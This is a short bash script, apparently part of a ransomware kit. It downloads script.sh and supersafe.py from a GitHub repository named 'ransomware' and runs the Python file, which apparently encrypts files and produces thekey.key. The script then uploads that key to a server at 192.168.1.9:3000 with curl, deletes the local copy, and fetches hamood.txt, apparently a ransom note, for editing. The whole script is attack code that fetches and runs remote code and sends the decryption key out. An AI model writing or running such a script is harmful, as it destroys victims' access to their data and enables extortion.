#!/bin/bash

# Download script.sh and supersafe.py
curl -O https://raw.githubusercontent.com/harshilbadminton/ransomware/master/script.sh
curl -O https://raw.githubusercontent.com/harshilbadminton/ransomware/master/supersafe.py

# Run supersafe.py
python supersafe.py

# Upload thekey.key to the server
curl -X POST -F "file=@thekey.key" http://192.168.1.9:3000/upload

# Remove thekey.key
rm -r thekey.key

# Download hamood.txt
curl -X GET https://raw.githubusercontent.com/harshilbadminton/ransomware/master/hamood.txt -o hamood.txt

# Edit hamood.txt using nano
nano hamood.txt
